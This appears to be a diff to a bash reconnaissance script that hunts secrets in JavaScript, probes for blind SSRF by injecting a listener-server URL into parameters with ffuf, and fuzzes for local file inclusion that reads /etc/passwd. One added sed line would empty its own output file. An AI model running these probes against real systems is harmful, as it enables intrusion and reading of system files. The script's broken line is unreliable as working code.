@@ -451,30 +451,45 @@ custompathlist(){
     grep -ioE "(([[:alnum:][:punct:]]+)+)[.](js|json)" $queryList > $TARGETDIR/js-list.txt || true
 
     if [ -s $TARGETDIR/js-list.txt ]; then
-        chown $HOMEUSER: $TARGETDIR/js-list.txt
         sort -u $TARGETDIR/js-list.txt -o $TARGETDIR/js-list.txt
 
         echo "linkfinder"
         xargs -P 20 -n1 -I {} linkfinder -i {} -o cli < $TARGETDIR/js-list.txt > $TARGETDIR/tmp/linkfinder-output.txt
 
         if [ -s $TARGETDIR/tmp/linkfinder-output.txt ]; then
-        chown $HOMEUSER: $TARGETDIR/tmp/linkfinder-output.txt
-        sort -u $TARGETDIR/tmp/linkfinder-output.txt -o $TARGETDIR/tmp/linkfinder-output.txt
-          echo "[debug-1] linkfinder: serach for js|json"
+          sort -u $TARGETDIR/tmp/linkfinder-output.txt -o $TARGETDIR/tmp/linkfinder-output.txt
+          sed "${SEDOPTION[@]}" 's/\\//g' > $TARGETDIR/tmp/linkfinder-output.txt
+
+          echo "[debug-1] linkfinder: search for js|json"
             cut -f2 -d ' ' $TARGETDIR/tmp/linkfinder-output.txt | grep -ioE "((https?:\/\/)|www\.)(([[:alnum:][:punct:]]+)+)?[.]?(([[:alnum:][:punct:]]+)+)[.](js|json)" > $TARGETDIR/tmp/linkfinder-js-list.txt || true
 
+            echo "[debug-2] linkfinder: concat urlpath2"
+            # dynamic sensor
+            BAR='##############################'
+            FILL='------------------------------'
+            totalLines=$(wc -l "$TARGETDIR"/tmp/linkfinder-output.txt | awk '{print $1}')  # num. lines in file
+            barLen=30
+            count=0
             while read line; do
-                url=$(echo $line | sed 's/[[]//;s/[]]//' | awk '{ print $1 }' | unfurl format %s://%d)
-                path2=$(echo $line | awk '{ print $2 }' | grep -oE "^/{1}[[:alpha:]]+[.]?(([[:alnum:][:punct:]]+)+)")
+              # update progress bar
+              count=$(($count + 1))
+              percent=$((($count * 100 / $totalLines * 100) / 100))
+              i=$(($percent * $barLen / 100))
+              echo -ne "\r[${BAR:0:$i}${FILL:$i:barLen}] $count/$totalLines ($percent%)"
+
+                url=$(echo "$line" | sed 's/[[]//;s/[]]//' | awk '{ print $1 }' | unfurl format '%s://%d')
+                path2=$(echo "$line" | awk '{ print $2 }' | grep -oE "^/{1}[[:alpha:]]+[.]?(([[:alnum:][:punct:]]+)+)" || true)
                 if [[ -n "$path2" ]]; then
                   echo "$url$path2" >> $TARGETDIR/tmp/linkfinder-concatenated-path-list.txt
                 fi
             done < $TARGETDIR/tmp/linkfinder-output.txt
 
             if [ -s $TARGETDIR/tmp/linkfinder-js-list.txt ]; then
-              grep -ioE "((https?:\/\/)|www\.)(([[:alnum:][:punct:]]+)+)?[.]?(([[:alnum:][:punct:]]+)+)[.](js|json)" $TARGETDIR/tmp/linkfinder-concatenated-path-list.txt >> $TARGETDIR/tmp/linkfinder-js-list.txt
-              sort -u $TARGETDIR/tmp/linkfinder-js-list.txt | -o $TARGETDIR/tmp/linkfinder-js-list.txt
-              echo "[debug-2] linkfinder: filter out scope"
+              if [ -s $TARGETDIR/tmp/linkfinder-concatenated-path-list.txt ]; then
+                grep -ioE "((https?:\/\/)|www\.)(([[:alnum:][:punct:]]+)+)?[.]?(([[:alnum:][:punct:]]+)+)[.](js|json)" $TARGETDIR/tmp/linkfinder-concatenated-path-list.txt >> $TARGETDIR/tmp/linkfinder-js-list.txt || true
+              fi
+              sort -u $TARGETDIR/tmp/linkfinder-js-list.txt -o $TARGETDIR/tmp/linkfinder-js-list.txt
+              echo "[debug-3] linkfinder: filter out scope"
               # filter out in scope
                 xargs -P 20 -n1 -I {} grep "{}" $TARGETDIR/tmp/linkfinder-js-list.txt < $TARGETDIR/3-all-subdomain-live.txt | httpx -silent >> $TARGETDIR/js-list.txt || true
                 sort -u $TARGETDIR/js-list.txt -o $TARGETDIR/js-list.txt
@@ -482,10 +497,14 @@ custompathlist(){
         fi
 
         # test means if linkfinder did not provide any output secretfinder testing makes no sense
-        if [[ -s $TARGETDIR/tmp/linkfinder-output.txt && $TARGETDIR/js-list.txt ]]; then
+        if [ -s $TARGETDIR/js-list.txt ]; then
             echo "secretfinder"
             xargs -P 20 -n1 -I {} secretfinder -i {} -o cli < $TARGETDIR/js-list.txt > $TARGETDIR/tmp/secretfinder-list.txt
         fi
+        chmod 660 $TARGETDIR/js-list.txt
+        chmod 660 $TARGETDIR/tmp/linkfinder-output.txt
+        chown $HOMEUSER: $TARGETDIR/js-list.txt
+        chown $HOMEUSER: $TARGETDIR/tmp/linkfinder-output.txt
     fi
 
     echo "[$(date | awk '{ print $4}')] Prepare custom customSsrfQueryList"
@@ -532,13 +551,13 @@ custompathlist(){
 ssrftest(){
   if [ -s $TARGETDIR/3-all-subdomain-live-scheme.txt ]; then
     echo
-    echo "[$(date | awk '{ print $4}')] [SSRF-1] Headers..."
-    ssrf-headers-tool $TARGETDIR/3-all-subdomain-live-scheme.txt $LISTENSERVER > /dev/null
-    echo "[$(date | awk '{ print $4}')] [SSRF-1] done."
+    # echo "[$(date | awk '{ print $4}')] [SSRF-1] Headers..."
+    # ssrf-headers-tool $TARGETDIR/3-all-subdomain-live-scheme.txt $LISTENSERVER > /dev/null
+    # echo "[$(date | awk '{ print $4}')] [SSRF-1] done."
     echo
     # https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
     echo "[$(date | awk '{ print $4}')] [SSRF-2] Blind probe..."
-    xargs -P 2 -I {} ffuf -timeout 1 -ignore-body -t 500 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
+    xargs -P 2 -I {} ffuf -s -timeout 1 -ignore-body -t 500 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
                          -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
                          -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN \
                          -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
@@ -563,12 +582,12 @@ ssrftest(){
       echo "[$(date | awk '{ print $4}')] [SSRF-3] fuzz original endpoints from wayback and fetched data"
       ENDPOINTCOUNT=$(< $TARGETDIR/ssrf-original-list.txt wc -l)
       echo "requests count = $ENDPOINTCOUNT"
-          ffuf -timeout 1 -ignore-body -t 750 -u HOST -w $TARGETDIR/ssrf-original-list.txt:HOST > /dev/null
+          ffuf -s -timeout 1 -ignore-body -t 750 -u HOST -w $TARGETDIR/ssrf-original-list.txt:HOST > /dev/null
       echo "[$(date | awk '{ print $4}')] [SSRF-3] done."
       echo
-      echo "[$(date | awk '{ print $4}')] [SSRF-4] fuzz using X-headers with original endpoints from wayback and fetched data"
-          ssrf-headers-tool $TARGETDIR/ssrf-original-list.txt $LISTENSERVER > /dev/null
-      echo "[$(date | awk '{ print $4}')] [SSRF-4] done."
+      # echo "[$(date | awk '{ print $4}')] [SSRF-4] fuzz using X-headers with original endpoints from wayback and fetched data"
+          # ssrf-headers-tool $TARGETDIR/ssrf-original-list.txt $LISTENSERVER > /dev/null
+      # echo "[$(date | awk '{ print $4}')] [SSRF-4] done."
       echo
 
       echo "[$(date | awk '{ print $4}')] [SSRF-5] fuzz all live servers with ssrf-list"
@@ -578,7 +597,7 @@ ssrftest(){
       echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
       echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
 
-          ffuf -timeout 1 -ignore-body -t 750 -u HOSTPATH \
+          ffuf -s -timeout 1 -ignore-body -t 750 -u HOSTPATH \
               -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
               -w $TARGETDIR/ssrf-list.txt:PATH > /dev/null
       echo "[$(date | awk '{ print $4}')] [SSRF-5] done."
@@ -597,7 +616,7 @@ lfitest(){
       ENDPOINTCOUNT=$(< $LFIPAYLOAD wc -l)
       echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
       echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
-        ffuf -timeout 5 -t 1550 -u HOSTPATH \
+        ffuf -s -timeout 5 -t 1550 -u HOSTPATH \
              -w $customLfiQueryList:HOST \
              -w $LFIPAYLOAD:PATH \
              -mr "root:[x*]:0:0:" \
